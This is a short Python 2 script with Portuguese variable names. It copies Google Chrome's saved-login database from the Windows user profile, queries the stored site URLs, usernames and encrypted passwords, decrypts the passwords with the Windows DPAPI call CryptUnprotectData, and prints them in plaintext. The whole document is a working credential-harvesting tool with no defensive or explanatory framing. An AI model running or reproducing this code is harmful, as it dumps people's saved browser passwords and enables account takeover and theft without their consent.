import os, sqlite3, shutil, win32crypt

banco = os.getenv("LOCALAPPDATA") + \
    "\\Google\\Chrome\\User Data\\Default\\Login Data"
banco2 = banco + "2"
shutil.copyfile(banco, banco2)
conexao = sqlite3.connect(banco2)
consulta = conexao.cursor()
consulta.execute("SELECT action_url, username_value, password_value FROM logins")
for site,login,senha in consulta.fetchall():
    #print senha
    print site + "\n" + login
    senha = win32crypt.CryptUnprotectData(senha)
    print senha[1].decode("ISO-8859-1") + "\n"
conexao.close()
os.remove(banco2)